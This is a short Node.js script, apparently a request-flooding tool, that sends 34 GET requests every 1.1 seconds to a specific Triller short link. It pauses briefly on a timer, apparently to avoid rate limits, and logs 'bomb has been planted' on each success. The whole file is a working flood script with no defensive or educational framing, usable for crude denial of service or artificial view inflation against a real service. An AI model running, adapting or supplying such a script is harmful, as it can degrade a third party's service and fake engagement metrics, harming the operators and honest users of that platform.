const request = require('request');
const url = 'https://v.triller.co/RNr66r';
var answer = '';

const send = () => request({
  method: 'GET',
  url: url,
}, function (error, response, body) {
  if (!error && response.statusCode == 200) {
    answer = body;
    console.log('bomb has been planted')
  } else {
    console.log('ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR')
  }
})

let gnida = setInterval(() => {
  send(); send(); send(); send(); send(); send(); send(); send(); send(); send();
  send(); send(); send(); send(); send(); send(); send(); send(); send(); send();
  send(); send(); send(); send(); send(); send(); send(); send(); send(); send();
  send(); send(); send(); send();
  console.info('___________________________________________')
}, 1100);

setInterval(() => {
  clearInterval(gnida)

  setTimeout(() => {
    console.log('CHILL TIME - CHILL TIME - CHILL TIME - CHILL TIME - CHILL TIME - ')
    gnida = setInterval(() => {
      send(); send(); send(); send(); send(); send(); send(); send(); send(); send();
      send(); send(); send(); send(); send(); send(); send(); send(); send(); send();
      send(); send(); send(); send(); send(); send(); send(); send(); send(); send();
      send(); send(); send(); send();
      console.info('___________________________________________');
    }, 1100);
  }, 4000)
}, 22000);

